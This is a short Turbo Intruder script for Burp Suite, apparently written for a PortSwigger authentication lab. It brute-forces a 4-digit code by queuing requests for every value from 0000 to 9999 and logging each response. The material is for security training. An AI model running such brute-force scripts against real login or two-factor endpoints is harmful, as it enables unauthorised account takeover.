def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.BURP
                           )

    
    for word in open('/home/phantomMenace/portswigger_labs/Authentication/0000-9999.txt'):
        word = word.strip()
        engine.queue(target.req, word)

def handleResponse(req, interesting):
    table.add(req)


